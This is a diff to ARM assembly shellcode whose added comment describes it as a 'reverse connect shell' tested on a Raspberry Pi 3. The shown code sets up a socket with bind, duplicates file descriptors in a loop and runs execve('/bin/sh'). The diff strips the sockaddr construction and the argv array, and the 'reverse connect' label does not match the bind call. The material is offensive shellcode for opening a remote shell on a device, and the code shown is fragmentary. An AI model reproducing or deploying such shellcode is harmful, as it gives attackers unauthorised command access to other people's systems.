@@ -1,5 +1,6 @@
 /**
-
+  reverse connect shell
+  tested on raspberry pi 3
 */
 
     .global _start
@@ -24,12 +25,7 @@ _start:
     
     // bind(s, &sa, sizeof(sa));  
     mov    r2, #16      // r2 = sizeof(sa)
-    adr    r1, sin_port // r1 = sa.sin_port
-    ldr    r1, [r1]
-    eor    r3, r3, r3
-    push   {r1, r3}
-    mov    r1, sp       // r1 = &sa 
-    //mvn    r1, r1    
+    adr    r1, sin_port // r1 = sa.sin_port   
     add    r7, #1       // r7 = 281+1 = 282 = bind
     svc    1
   
@@ -59,12 +55,10 @@ dup_loop:
     sub    r1, #1       // 
     bpl    dup_loop
 
-    // execve("/bin/sh", {"/bin/sh", NULL}, NULL);
+    // execve("/bin/sh", NULL, NULL);
     adr    r0, sh       // r0 = "/bin/sh" 
     eor    r2, r2, r2   // r2 = NULL
     eor    r1, r1, r1   // r1 = NULL
-    // push {r0, r2}      // "/bin/sh", NULL
-    // mov  r1, sp        // r1 = {"/bin/sh", NULL}
     mov    r7, #11      // r7 = execve
     svc    1
     nop
